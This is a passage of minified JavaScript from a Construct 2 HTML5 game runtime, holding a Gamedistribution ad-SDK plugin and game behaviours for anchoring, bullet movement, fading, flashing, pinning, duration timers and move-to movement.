                // 5 == o ? (clearTimeout(r), 0 == s && ((e = new _KIZ10API)._INIT(i, n), s = 1)) : o++
            // }), 800)
        }, t.cnds = new function () {}, o.prototype.SubmitScore = function (t, e) {
            // this.Kiz10API.submitStat(t, e)
        }, o.prototype.UnlockAchievement = function (t, e) {
            // this.Kiz10API.submitAchievProgress(t, e)
        }, t.acts = new o, t.exps = new function () {}
    }(), cr.plugins_.vooxe = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.vooxe.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime, window.vooxe = {}, window.GD_OPTIONS = {}
        };
        var e = t.Instance.prototype,
            i = !1;

        function n() {}

        function r() {}
        e.onCreate = function () {
            if (window.vooxe || window.GD_OPTIONS) {
                i = !0, this.vooxe = window.vooxe;
                var t = this;
                this.vooxe.onInit = function () {
                    cr.logexport("Gamedistribution.com SDK: onInit"), t.isShowingBannerAd = !1, t.runtime.trigger(cr.plugins_.vooxe.prototype.cnds.onInit, t)
                }, this.vooxe.onError = function () {
                    cr.logexport("Gamedistribution.com SDK: onError"), t.isShowingBannerAd = !0, t.runtime.trigger(cr.plugins_.vooxe.prototype.cnds.onError, t)
                }, this.vooxe.onResumeGame = function () {
                    cr.logexport("Gamedistribution.com SDK: onResume"), t.isShowingBannerAd = !1, t.runtime.trigger(cr.plugins_.vooxe.prototype.cnds.onResumeGame, t)
                }, this.vooxe.onPauseGame = function () {
                    cr.logexport("Gamedistribution.com SDK: onPauseGame"), t.isShowingBannerAd = !0, t.runtime.trigger(cr.plugins_.vooxe.prototype.cnds.onPauseGame, t)
                }, this.vooxe.InitAds = function () {
                    window.GD_OPTIONS = {
                        gameId: t.properties[0],
                        userId: t.properties[1],
                        advertisementSettings: {
                            autoplay: !1
                        },
                        onEvent: function (e) {
                            switch (e.name) {
                                case "SDK_GAME_START":
                                    t.vooxe.onResumeGame();
                                    break;
                                case "SDK_GAME_PAUSE":
                                    t.vooxe.onPauseGame();
                                    break;
                                case "SDK_READY":
                                    t.vooxe.onInit();
                                    break;
                                case "SDK_ERROR":
                                    t.vooxe.onError();
                                    break
                            }
                        }
                    }
                }
            } else cr.logexport("[Construct 2] Gamedistribution.com SDK is required to show advertisements within Cordova; other platforms are not supported.")
        }, n.prototype.IsShowingBanner = function () {
            return this.isShowingBannerAd
        }, n.prototype.onInit = function () {
            return !0
        }, n.prototype.onError = function (t) {
            return !0
        }, n.prototype.onResumeGame = function (t) {
            return !0
        }, n.prototype.onPauseGame = function (t) {
            return !0
        }, t.cnds = new n, r.prototype.isFirst = !0, r.prototype.ShowBanner = function () {
            this.vooxe.onResumeGame(), r.prototype.isFirst ? r.prototype.isFirst = !1 : (adManager.showInterstitial(), this.isShowingBannerAd = !0)
        }, r.prototype.PlayLog = function () {
            if (i) return void 0 === window.gdsdk.play ? (cr.logexport("Gamedistribution.com SDK is not loaded."), void this.vooxe.onResumeGame()) : void window.gdsdk.play()
        }, r.prototype.CustomLog = function () {
            if (i) return void 0 === window.gdsdk.customLog ? (cr.logexport("Gamedistribution.com SDK is not loaded."), void this.vooxe.onResumeGame()) : void window.gdsdk.customLog()
        }, r.prototype.InitAds = function () {
            i && this.vooxe.InitAds()
        }, t.acts = new r, t.exps = new function () {}
    }(), cr.behaviors.Anchor = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.behaviors.Anchor.prototype;
        t.Type = function (t, e) {
            this.behavior = t, this.objtype = e, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t, e) {
            this.type = t, this.behavior = t.behavior, this.inst = e, this.runtime = t.runtime
        };
        var e = t.Instance.prototype;

        function i() {}
        e.onCreate = function () {
            this.anch_left = this.properties[0], this.anch_top = this.properties[1], this.anch_right = this.properties[2], this.anch_bottom = this.properties[3], this.inst.update_bbox(), this.xleft = this.inst.bbox.left, this.ytop = this.inst.bbox.top, this.xright = this.runtime.original_width - this.inst.bbox.left, this.ybottom = this.runtime.original_height - this.inst.bbox.top, this.rdiff = this.runtime.original_width - this.inst.bbox.right, this.bdiff = this.runtime.original_height - this.inst.bbox.bottom, this.enabled = 0 !== this.properties[4]
        }, e.saveToJSON = function () {
            return {
                xleft: this.xleft,
                ytop: this.ytop,
                xright: this.xright,
                ybottom: this.ybottom,
                rdiff: this.rdiff,
                bdiff: this.bdiff,
                enabled: this.enabled
            }
        }, e.loadFromJSON = function (t) {
            this.xleft = t.xleft, this.ytop = t.ytop, this.xright = t.xright, this.ybottom = t.ybottom, this.rdiff = t.rdiff, this.bdiff = t.bdiff, this.enabled = t.enabled
        }, e.tick = function () {
            if (this.enabled) {
                var t, e = this.inst.layer,
                    i = this.inst,
                    n = this.inst.bbox;
                0 === this.anch_left ? (i.update_bbox(), 0 !== (t = e.viewLeft + this.xleft - n.left) && (i.x += t, i.set_bbox_changed())) : 1 === this.anch_left && (i.update_bbox(), 0 !== (t = e.viewRight - this.xright - n.left) && (i.x += t, i.set_bbox_changed())), 0 === this.anch_top ? (i.update_bbox(), 0 !== (t = e.viewTop + this.ytop - n.top) && (i.y += t, i.set_bbox_changed())) : 1 === this.anch_top && (i.update_bbox(), 0 !== (t = e.viewBottom - this.ybottom - n.top) && (i.y += t, i.set_bbox_changed())), 1 === this.anch_right && (i.update_bbox(), 0 !== (t = e.viewRight - this.rdiff - n.right) && (i.width += t, i.width < 0 && (i.width = 0), i.set_bbox_changed())), 1 === this.anch_bottom && (i.update_bbox(), 0 !== (t = e.viewBottom - this.bdiff - n.bottom) && (i.height += t, i.height < 0 && (i.height = 0), i.set_bbox_changed()))
            }
        }, t.cnds = new function () {}, i.prototype.SetEnabled = function (t) {
            this.enabled && 0 === t ? this.enabled = !1 : this.enabled || 0 === t || (this.inst.update_bbox(), this.xleft = this.inst.bbox.left, this.ytop = this.inst.bbox.top, this.xright = this.runtime.original_width - this.inst.bbox.left, this.ybottom = this.runtime.original_height - this.inst.bbox.top, this.rdiff = this.runtime.original_width - this.inst.bbox.right, this.bdiff = this.runtime.original_height - this.inst.bbox.bottom, this.enabled = !0)
        }, t.acts = new i, t.exps = new function () {}
    }(), cr.behaviors.Bullet = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.behaviors.Bullet.prototype;
        t.Type = function (t, e) {
            this.behavior = t, this.objtype = e, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t, e) {
            this.type = t, this.behavior = t.behavior, this.inst = e, this.runtime = t.runtime
        };
        var e = t.Instance.prototype;

        function i() {}

        function n() {}

        function r() {}
        e.onCreate = function () {
            var t = this.properties[0];
            this.acc = this.properties[1], this.g = this.properties[2], this.bounceOffSolid = 0 !== this.properties[3], this.setAngle = 0 !== this.properties[4], this.dx = Math.cos(this.inst.angle) * t, this.dy = Math.sin(this.inst.angle) * t, this.lastx = this.inst.x, this.lasty = this.inst.y, this.lastKnownAngle = this.inst.angle, this.travelled = 0, this.enabled = 0 !== this.properties[5]
        }, e.saveToJSON = function () {
            return {
                acc: this.acc,
                g: this.g,
                dx: this.dx,
                dy: this.dy,
                lx: this.lastx,
                ly: this.lasty,
                lka: this.lastKnownAngle,
                t: this.travelled,
                e: this.enabled
            }
        }, e.loadFromJSON = function (t) {
            this.acc = t.acc, this.g = t.g, this.dx = t.dx, this.dy = t.dy, this.lastx = t.lx, this.lasty = t.ly, this.lastKnownAngle = t.lka, this.travelled = t.t, this.enabled = t.e
        }, e.tick = function () {
            if (this.enabled) {
                var t, e, i, n, r = this.runtime.getDt(this.inst);
                this.inst.angle !== this.lastKnownAngle && (this.setAngle && (t = cr.distanceTo(0, 0, this.dx, this.dy), this.dx = Math.cos(this.inst.angle) * t, this.dy = Math.sin(this.inst.angle) * t), this.lastKnownAngle = this.inst.angle), 0 !== this.acc && (t = cr.distanceTo(0, 0, this.dx, this.dy), e = 0 === this.dx && 0 === this.dy ? this.inst.angle : cr.angleTo(0, 0, this.dx, this.dy), (t += this.acc * r) < 0 && (t = 0), this.dx = Math.cos(e) * t, this.dy = Math.sin(e) * t), 0 !== this.g && (this.dy += this.g * r), this.lastx = this.inst.x, this.lasty = this.inst.y, 0 === this.dx && 0 === this.dy || (this.inst.x += this.dx * r, this.inst.y += this.dy * r, this.travelled += cr.distanceTo(0, 0, this.dx * r, this.dy * r), this.setAngle && (this.inst.angle = cr.angleTo(0, 0, this.dx, this.dy), this.inst.set_bbox_changed(), this.lastKnownAngle = this.inst.angle), this.inst.set_bbox_changed(), this.bounceOffSolid && (i = this.runtime.testOverlapSolid(this.inst)) && (this.runtime.registerCollision(this.inst, i), t = cr.distanceTo(0, 0, this.dx, this.dy), n = this.runtime.calculateSolidBounceAngle(this.inst, this.lastx, this.lasty), this.dx = Math.cos(n) * t, this.dy = Math.sin(n) * t, this.inst.x += this.dx * r, this.inst.y += this.dy * r, this.inst.set_bbox_changed(), this.setAngle && (this.inst.angle = n, this.lastKnownAngle = n, this.inst.set_bbox_changed()), this.runtime.pushOutSolid(this.inst, this.dx / t, this.dy / t, Math.max(2.5 * t * r, 30)) || this.runtime.pushOutSolidNearest(this.inst, 100)))
            }
        }, i.prototype.CompareSpeed = function (t, e) {
            return cr.do_cmp(cr.distanceTo(0, 0, this.dx, this.dy), t, e)
        }, i.prototype.CompareTravelled = function (t, e) {
            return cr.do_cmp(this.travelled, t, e)
        }, t.cnds = new i, n.prototype.SetSpeed = function (t) {
            var e = cr.angleTo(0, 0, this.dx, this.dy);
            this.dx = Math.cos(e) * t, this.dy = Math.sin(e) * t
        }, n.prototype.SetAcceleration = function (t) {
            this.acc = t
        }, n.prototype.SetGravity = function (t) {
            this.g = t
        }, n.prototype.SetAngleOfMotion = function (t) {
            t = cr.to_radians(t);
            var e = cr.distanceTo(0, 0, this.dx, this.dy);
            this.dx = Math.cos(t) * e, this.dy = Math.sin(t) * e
        }, n.prototype.Bounce = function (t) {
            if (t) {
                var e = t.getFirstPicked(this.inst);
                if (e) {
                    var i = this.runtime.getDt(this.inst),
                        n = cr.distanceTo(0, 0, this.dx, this.dy),
                        r = this.runtime.calculateSolidBounceAngle(this.inst, this.lastx, this.lasty, e);
                    this.dx = Math.cos(r) * n, this.dy = Math.sin(r) * n, this.inst.x += this.dx * i, this.inst.y += this.dy * i, this.inst.set_bbox_changed(), this.setAngle && (this.inst.angle = r, this.lastKnownAngle = r, this.inst.set_bbox_changed()), 0 !== n && (this.bounceOffSolid ? this.runtime.pushOutSolid(this.inst, this.dx / n, this.dy / n, Math.max(2.5 * n * i, 30)) || this.runtime.pushOutSolidNearest(this.inst, 100) : this.runtime.pushOut(this.inst, this.dx / n, this.dy / n, Math.max(2.5 * n * i, 30), e))
                }
            }
        }, n.prototype.SetDistanceTravelled = function (t) {
            this.travelled = t
        }, n.prototype.SetEnabled = function (t) {
            this.enabled = 1 === t
        }, t.acts = new n, r.prototype.Speed = function (t) {
            var e = cr.distanceTo(0, 0, this.dx, this.dy);
            e = cr.round6dp(e), t.set_float(e)
        }, r.prototype.Acceleration = function (t) {
            t.set_float(this.acc)
        }, r.prototype.AngleOfMotion = function (t) {
            t.set_float(cr.to_degrees(cr.angleTo(0, 0, this.dx, this.dy)))
        }, r.prototype.DistanceTravelled = function (t) {
            t.set_float(this.travelled)
        }, r.prototype.Gravity = function (t) {
            t.set_float(this.g)
        }, t.exps = new r
    }(), cr.behaviors.Fade = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.behaviors.Fade.prototype;
        t.Type = function (t, e) {
            this.behavior = t, this.objtype = e, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t, e) {
            this.type = t, this.behavior = t.behavior, this.inst = e, this.runtime = t.runtime
        };
        var e = t.Instance.prototype;

        function i() {}

        function n() {}

        function r() {}
        e.onCreate = function () {
            this.activeAtStart = 1 === this.properties[0], this.setMaxOpacity = !1, this.fadeInTime = this.properties[1], this.waitTime = this.properties[2], this.fadeOutTime = this.properties[3], this.destroy = this.properties[4], this.stage = this.activeAtStart ? 0 : 3, this.recycled ? this.stageTime.reset() : this.stageTime = new cr.KahanAdder, this.maxOpacity = this.inst.opacity ? this.inst.opacity : 1, this.activeAtStart && (0 === this.fadeInTime ? (this.stage = 1, 0 === this.waitTime && (this.stage = 2)) : (this.inst.opacity = 0, this.runtime.redraw = !0))
        }, e.saveToJSON = function () {
            return {
                fit: this.fadeInTime,
                wt: this.waitTime,
                fot: this.fadeOutTime,
                s: this.stage,
                st: this.stageTime.sum,
                mo: this.maxOpacity
            }
        }, e.loadFromJSON = function (t) {
            this.fadeInTime = t.fit, this.waitTime = t.wt, this.fadeOutTime = t.fot, this.stage = t.s, this.stageTime.reset(), this.stageTime.sum = t.st, this.maxOpacity = t.mo
        }, e.tick = function () {
            this.stageTime.add(this.runtime.getDt(this.inst)), 0 === this.stage && (this.inst.opacity = this.stageTime.sum / this.fadeInTime * this.maxOpacity, this.runtime.redraw = !0, this.inst.opacity >= this.maxOpacity && (this.inst.opacity = this.maxOpacity, this.stage = 1, this.stageTime.reset(), this.runtime.trigger(cr.behaviors.Fade.prototype.cnds.OnFadeInEnd, this.inst))), 1 === this.stage && this.stageTime.sum >= this.waitTime && (this.stage = 2, this.stageTime.reset(), this.runtime.trigger(cr.behaviors.Fade.prototype.cnds.OnWaitEnd, this.inst)), 2 === this.stage && 0 !== this.fadeOutTime && (this.inst.opacity = this.maxOpacity - this.stageTime.sum / this.fadeOutTime * this.maxOpacity, this.runtime.redraw = !0, this.inst.opacity < 0 && (this.inst.opacity = 0, this.stage = 3, this.stageTime.reset(), this.runtime.trigger(cr.behaviors.Fade.prototype.cnds.OnFadeOutEnd, this.inst), 1 === this.destroy && this.runtime.DestroyInstance(this.inst)))
        }, e.doStart = function () {
            this.stage = 0, this.stageTime.reset(), 0 === this.fadeInTime ? (this.stage = 1, 0 === this.waitTime && (this.stage = 2)) : (this.inst.opacity = 0, this.runtime.redraw = !0)
        }, i.prototype.OnFadeOutEnd = function () {
            return !0
        }, i.prototype.OnFadeInEnd = function () {
            return !0
        }, i.prototype.OnWaitEnd = function () {
            return !0
        }, t.cnds = new i, n.prototype.StartFade = function () {
            this.activeAtStart || this.setMaxOpacity || (this.maxOpacity = this.inst.opacity ? this.inst.opacity : 1, this.setMaxOpacity = !0), 3 === this.stage && this.doStart()
        }, n.prototype.RestartFade = function () {
            this.doStart()
        }, n.prototype.SetFadeInTime = function (t) {
            t < 0 && (t = 0), this.fadeInTime = t
        }, n.prototype.SetWaitTime = function (t) {
            t < 0 && (t = 0), this.waitTime = t
        }, n.prototype.SetFadeOutTime = function (t) {
            t < 0 && (t = 0), this.fadeOutTime = t
        }, t.acts = new n, r.prototype.FadeInTime = function (t) {
            t.set_float(this.fadeInTime)
        }, r.prototype.WaitTime = function (t) {
            t.set_float(this.waitTime)
        }, r.prototype.FadeOutTime = function (t) {
            t.set_float(this.fadeOutTime)
        }, t.exps = new r
    }(), cr.behaviors.Flash = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.behaviors.Flash.prototype;
        t.Type = function (t, e) {
            this.behavior = t, this.objtype = e, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t, e) {
            this.type = t, this.behavior = t.behavior, this.inst = e, this.runtime = t.runtime
        };
        var e = t.Instance.prototype;

        function i() {}

        function n() {}
        e.onCreate = function () {
            this.ontime = 0, this.offtime = 0, this.stage = 0, this.stagetimeleft = 0, this.timeleft = 0
        }, e.saveToJSON = function () {
            return {
                ontime: this.ontime,
                offtime: this.offtime,
                stage: this.stage,
                stagetimeleft: this.stagetimeleft,
                timeleft: this.timeleft
            }
        }, e.loadFromJSON = function (t) {
            this.ontime = t.ontime, this.offtime = t.offtime, this.stage = t.stage, this.stagetimeleft = t.stagetimeleft, this.timeleft = t.timeleft, null === this.timeleft && (this.timeleft = 1 / 0)
        }, e.tick = function () {
            if (!(this.timeleft <= 0)) {
                var t = this.runtime.getDt(this.inst);
                if (this.timeleft -= t, this.timeleft <= 0) return this.timeleft = 0, this.inst.visible = !0, this.runtime.redraw = !0, void this.runtime.trigger(cr.behaviors.Flash.prototype.cnds.OnFlashEnded, this.inst);
                this.stagetimeleft -= t, this.stagetimeleft <= 0 && (0 === this.stage ? (this.inst.visible = !1, this.stage = 1, this.stagetimeleft += this.offtime) : (this.inst.visible = !0, this.stage = 0, this.stagetimeleft += this.ontime), this.runtime.redraw = !0)
            }
        }, i.prototype.IsFlashing = function () {
            return this.timeleft > 0
        }, i.prototype.OnFlashEnded = function () {
            return !0
        }, t.cnds = new i, n.prototype.Flash = function (t, e, i) {
            this.ontime = t, this.offtime = e, this.stage = 1, this.stagetimeleft = e, this.timeleft = i, this.inst.visible = !1, this.runtime.redraw = !0
        }, n.prototype.StopFlashing = function () {
            this.timeleft = 0, this.inst.visible = !0, this.runtime.redraw = !0
        }, t.acts = new n, t.exps = new function () {}
    }(), cr.behaviors.Pin = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.behaviors.Pin.prototype;
        t.Type = function (t, e) {
            this.behavior = t, this.objtype = e, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t, e) {
            this.type = t, this.behavior = t.behavior, this.inst = e, this.runtime = t.runtime
        };
        var e = t.Instance.prototype;

        function i() {}

        function n() {}

        function r() {}
        e.onCreate = function () {
            this.pinObject = null, this.pinObjectUid = -1, this.pinAngle = 0, this.pinDist = 0, this.myStartAngle = 0, this.theirStartAngle = 0, this.lastKnownAngle = 0, this.mode = 0;
            var t = this;
            this.recycled || (this.myDestroyCallback = function (e) {
                t.onInstanceDestroyed(e)
            }), this.runtime.addDestroyCallback(this.myDestroyCallback)
        }, e.saveToJSON = function () {
            return {
                uid: this.pinObject ? this.pinObject.uid : -1,
                pa: this.pinAngle,
                pd: this.pinDist,
                msa: this.myStartAngle,
                tsa: this.theirStartAngle,
                lka: this.lastKnownAngle,
                m: this.mode
            }
        }, e.loadFromJSON = function (t) {
            this.pinObjectUid = t.uid, this.pinAngle = t.pa, this.pinDist = t.pd, this.myStartAngle = t.msa, this.theirStartAngle = t.tsa, this.lastKnownAngle = t.lka, this.mode = t.m
        }, e.afterLoad = function () {
            -1 === this.pinObjectUid ? this.pinObject = null : this.pinObject = this.runtime.getObjectByUID(this.pinObjectUid), this.pinObjectUid = -1
        }, e.onInstanceDestroyed = function (t) {
            this.pinObject == t && (this.pinObject = null)
        }, e.onDestroy = function () {
            this.pinObject = null, this.runtime.removeDestroyCallback(this.myDestroyCallback)
        }, e.tick = function () {}, e.tick2 = function () {
            if (this.pinObject) {
                this.lastKnownAngle !== this.inst.angle && (this.myStartAngle = cr.clamp_angle(this.myStartAngle + (this.inst.angle - this.lastKnownAngle)));
                var t = this.inst.x,
                    e = this.inst.y;
                if (3 === this.mode || 4 === this.mode) {
                    var i = cr.distanceTo(this.inst.x, this.inst.y, this.pinObject.x, this.pinObject.y);
                    if (i > this.pinDist || 4 === this.mode && i < this.pinDist) {
                        var n = cr.angleTo(this.pinObject.x, this.pinObject.y, this.inst.x, this.inst.y);
                        t = this.pinObject.x + Math.cos(n) * this.pinDist, e = this.pinObject.y + Math.sin(n) * this.pinDist
                    }
                } else t = this.pinObject.x + Math.cos(this.pinObject.angle + this.pinAngle) * this.pinDist, e = this.pinObject.y + Math.sin(this.pinObject.angle + this.pinAngle) * this.pinDist;
                var r = cr.clamp_angle(this.myStartAngle + (this.pinObject.angle - this.theirStartAngle));
                this.lastKnownAngle = r, 0 !== this.mode && 1 !== this.mode && 3 !== this.mode && 4 !== this.mode || this.inst.x === t && this.inst.y === e || (this.inst.x = t, this.inst.y = e, this.inst.set_bbox_changed()), 0 !== this.mode && 2 !== this.mode || this.inst.angle === r || (this.inst.angle = r, this.inst.set_bbox_changed())
            }
        }, i.prototype.IsPinned = function () {
            return !!this.pinObject
        }, t.cnds = new i, n.prototype.Pin = function (t, e) {
            if (t) {
                var i = t.getFirstPicked(this.inst);
                i && (this.pinObject = i, this.pinAngle = cr.angleTo(i.x, i.y, this.inst.x, this.inst.y) - i.angle, this.pinDist = cr.distanceTo(i.x, i.y, this.inst.x, this.inst.y), this.myStartAngle = this.inst.angle, this.lastKnownAngle = this.inst.angle, this.theirStartAngle = i.angle, this.mode = e)
            }
        }, n.prototype.Unpin = function () {
            this.pinObject = null
        }, t.acts = new n, r.prototype.PinnedUID = function (t) {
            t.set_int(this.pinObject ? this.pinObject.uid : -1)
        }, t.exps = new r
    }(), cr.behaviors.Rex_Duration = function (t) {
        this.runtime = t
    },
    function () {
        var t = function () {
                this.lines = []
            },
            e = t.prototype;
        e.alloc = function (t, e) {
            var i;
            return this.lines.length > 0 ? (i = this.lines.pop(), t.LinkTimer(i)) : i = t.CreateTimer(e), i
        }, e.free = function (t) {
            this.lines.push(t)
        }, cr.behaviors.Rex_Duration.timer_cache = new t;
        var i = cr.behaviors.Rex_Duration.prototype;
        i.Type = function (t, e) {
            this.behavior = t, this.objtype = e, this.runtime = t.runtime
        };
        var n = i.Type.prototype;
        n.onCreate = function () {
            this.timeline = null, this.timelineUid = -1, this.timer_cache = cr.behaviors.Rex_Duration.timer_cache
        }, n.getTimelineObj = function () {
            if (null != this.timeline) return this.timeline;
            var t, e, i = this.runtime.types;
            for (t in i)
                if ((e = i[t].instances[0]) instanceof cr.plugins_.Rex_TimeLine.prototype.Instance) return this.timeline = e, this.timeline;
            return null
        }, n.timer_create = function (t, e) {
            var i = this.timer_cache.alloc(this.getTimelineObj(), t);
            return i.plugin = e, i
        }, n.timer_free = function (t) {
            t.plugin = null, this.timer_cache.free(t)
        }, n.timer_cache_clean = function () {
            this.timer_cache.lines.length = 0
        }, i.Instance = function (t, e) {
            this.type = t, this.behavior = t.behavior, this.inst = e, this.runtime = t.runtime
        };
        var r = i.Instance.prototype;
        r.onCreate = function () {
            this.recycled || (this.timers = {}), this.sync_timescale = 1 == this.properties[0], this._trigger_duration_name = "", this.is_my_call = !1, this.timers_save = null, this.timer_cache = cr.behaviors.Rex_Duration.timer_cache, this.pre_ts = 1
        }, r.onDestroy = function () {
            var t;
            for (t in this.timers) this.destroy_timer(t)
        }, r.create_timer = function (t) {
            var e = this.timers[t];
            return null != e ? (e.Remove(), e) : ((e = this.type.timer_create(s, this))._duration_name = t, this.timers[t] = e, e)
        }, r.destroy_timer = function (t) {
            var e = this.timers[t];
            null != e && (e.Remove(), delete this.timers[t], this.type.timer_free(e))
        }, r.tick = function () {
            this.sync_timescale && this.sync_ts()
        };
        var s = function () {
            this.plugin.on_timeout(this)
        };
        r.on_timeout = function (t) {
            var e = t._duration_name;
            this._trigger_duration_name = e;
            var i = t._duration_remain_time,
                n = t._interval_time;
            t.run_start ? (t.run_start = !1, this.run_callback(cr.behaviors.Rex_Duration.prototype.cnds.OnStart)) : i <= n ? (t._duration_remain_time = 0, i == n && this.run_callback(cr.behaviors.Rex_Duration.prototype.cnds.OnInterval), this.run_callback(cr.behaviors.Rex_Duration.prototype.cnds.OnEnd)) : (i -= n, t._duration_remain_time = i, this.run_callback(cr.behaviors.Rex_Duration.prototype.cnds.OnInterval)), t._duration_remain_time > 0 ? t.Start(Math.min(i, n)) : this.destroy_timer(e)
        }, r.run_callback = function (t) {
            this.is_my_call = !0, this.runtime.trigger(t, this.inst), this.is_my_call = !1
        };
        var o = function (t) {
            return t._duration_remain_time - t.ElapsedTimeGet()
        };

        function a() {}

        function h() {}

        function c() {}
        r.sync_ts = function () {
            var t = this.get_timescale();
            if (this.pre_ts != t) {
                var e;
                for (e in this.timers) this.timers[e].SetTimescale(t);
                this.pre_ts = t
            }
        }, r.get_timescale = function () {
            var t = this.inst.my_timescale;
            return -1 == t && (t = 1), t
        }, r.saveToJSON = function () {
            var t, e, i, n = {};
            for (t in this.timers)(i = (e = this.timers[t]).saveToJSON())._dt = e._duration_time, i._it = e._interval_time, i._drt = e._duration_remain_time, i._iss = e.run_start, n[t] = i;
            return {
                tims: n,
                tluid: null != this.type.timeline ? this.type.timeline.uid : -1
            }
        }, r.loadFromJSON = function (t) {
            this.timers_save = t.tims, this.type.timelineUid = t.tluid, this.type.timer_cache_clean()
        }, r.afterLoad = function () {
            var t, e, i;
            if (-1 === this.type.timelineUid ? this.type.timeline = null : this.type.timeline = this.runtime.getObjectByUID(this.type.timelineUid), null == this.timers_save) this.timers = {};
            else
                for (t in this.timers_save) i = this.timers_save[t], (e = this.create_timer(t))._duration_time = i._dt, e._interval_time = i._it, e._duration_remain_time = i._drt, e.run_start = i._iss, e.loadFromJSON(i), e.afterLoad();
            this.timers_save = null
        }, i.cnds = new a, a.prototype.IsRunning = function (t) {
            return null != this.timers[t]
        }, a.prototype.OnStart = function (t) {
            return this._trigger_duration_name == t && this.is_my_call
        }, a.prototype.OnInterval = function (t) {
            return this._trigger_duration_name == t && this.is_my_call
        }, a.prototype.OnEnd = function (t) {
            return this._trigger_duration_name == t && this.is_my_call
        }, i.acts = new h, h.prototype.Setup_deprecated = function () {}, h.prototype.Start_deprecated = function () {}, h.prototype.Start = function (t, e, i) {
            var n = this.create_timer(t);
            n._duration_time = e, n._interval_time = i, n._duration_remain_time = e, n.run_start = !0, n.Start(0), this.sync_timescale && n.SetTimescale(this.get_timescale())
        }, h.prototype.Pause = function (t) {
            var e = this.timers[t];
            null != e && e.Suspend()
        }, h.prototype.Resume = function (t) {
            null != this.timers[t] && this.timer.Resume()
        }, h.prototype.ForceToEnd = function (t) {
            var e = this.timers[t];
            null == e || e.run_start || (this._trigger_duration_name = t, this.run_callback(cr.behaviors.Rex_Duration.prototype.cnds.OnEnd)), this.destroy_timer(t)
        }, h.prototype.PauseAll = function () {
            var t, e;
            for (t in this.timers)(e = this.timers[t]).IsActive(), e.Suspend()
        }, h.prototype.ResumeAll = function () {
            var t, e;
            for (t in this.timers)(e = this.timers[t]).IsActive(), e.Resume()
        }, h.prototype.ForceToEndAll = function () {
            var t;
            for (t in this.timers) this.timers[t].run_start || (this._trigger_duration_name = t, this.run_callback(cr.behaviors.Rex_Duration.prototype.cnds.OnEnd)), this.destroy_timer(t)
        }, h.prototype.Cancel = function (t) {
            this.destroy_timer(t)
        }, h.prototype.Setup2 = function (t) {
            var e = t.instances[0];
            "TIMELINE" == e.check_name ? this.type.timeline = e : alert("Duration behavior should connect to a timeline object")
        }, h.prototype.SyncTimescale = function (t) {
            this.sync_timescale = 1 === t
        }, h.prototype.AddDurationTime = function (t, e) {
            if (0 != e) {
                var i = this.timers[t];
                if (null != i && (i._duration_time += e, i._duration_remain_time += e, e < 0)) {
                    var n = i._duration_remain_time;
                    n < 0 ? i.Start(n) : i._interval_time, i.Start(n)
                }
            }
        }, h.prototype.SetIntervalTime = function (t, e) {
            var i = this.timers[t];
            null != i && (i._interval_time = e)
        }, i.exps = new c, c.prototype.Remainder = function (t, e) {
            null == e && (e = this._trigger_duration_name);
            var i, n = this.timers[e];
            i = null == n ? 0 : o(n), t.set_float(i)
        }, c.prototype.Elapsed = function (t, e) {
            null == e && (e = this._trigger_duration_name);
            var i, n = this.timers[e];
            i = null == n ? 0 : n._duration_time - o(n), t.set_float(i)
        }, c.prototype.RemainderPercent = function (t, e) {
            null == e && (e = this._trigger_duration_name);
            var i, n = this.timers[e];
            i = null == n ? 0 : o(n) / n._duration_time, t.set_float(i)
        }, c.prototype.ElapsedPercent = function (t, e) {
            null == e && (e = this._trigger_duration_name);
            var i, n = this.timers[e];
            i = null == n ? 0 : (n._duration_time - o(n)) / n._duration_time, t.set_float(i)
        }, c.prototype.Interval = function (t, e) {
            null == e && (e = this._trigger_duration_name);
            var i, n = this.timers[e];
            i = null == n ? 0 : n._interval_time, t.set_float(i)
        }, c.prototype.Duration = function (t, e) {
            null == e && (e = this._trigger_duration_name);
            var i, n = this.timers[e];
            i = null == n ? 0 : n._duration_time, t.set_float(i)
        }
    }(), cr.behaviors.Rex_MoveTo = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.behaviors.Rex_MoveTo.prototype;
        t.Type = function (t, e) {
            this.behavior = t, this.objtype = e, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t, e) {
            this.type = t, this.behavior = t.behavior, this.inst = e, this.runtime = t.runtime
        };
        var e = t.Instance.prototype;
        e.onCreate = function () {
            this.enabled = 1 === this.properties[0], this.recycled || (this.moveParams = {}), this.moveParams.max = this.properties[1], this.moveParams.acc = this.properties[2], this.moveParams.dec = this.properties[3], this.soildStopEnable = 1 === this.properties[4], this.isContinueMode = 1 === this.properties[5], this.recycled || (this.target = {
                x: 0,
                y: 0,
                a: 0
            }), this.isMoving = !1, this.currentSpeed = 0, this.remainDistance = 0, this.remainDt = 0, this.recycled || (this.prePosition = {
                x: 0,
                y: 0
            }), this.prePosition.x = 0, this.prePosition.y = 0, this.movingAngleData = i(this.movingAngleData), this.movingAngleStartData = i(this.movingAngleStartData), this.lastTick = null, this.isMyCall = !1
        };
        var i = function (t) {
            return null == t && (t = {}), t.x = 0, t.y = 0, t.a = -1, t
        };

        function n(t) {
            if (null == t || "object" != typeof t) return t;
            var e = t.constructor();
            for (var i in t) t.hasOwnProperty(i) && (e[i] = t[i]);
            return e
        }

        function r() {}

        function s() {}

        function o() {}
        e.tick = function () {
            if (this.remainDt = 0, this.enabled && this.isMoving) {
                var t = this.runtime.getDt(this.inst);
                this.move(t)
            }
        }, e.move = function (t) {
            if (0 != t) {
                this.prePosition.x === this.inst.x && this.prePosition.y === this.inst.y || this.resetCurrentPosition();
                var e = !1;
                if (0 != this.moveParams.dec) e = this.currentSpeed * this.currentSpeed / (2 * this.moveParams.dec) >= this.remainDistance;
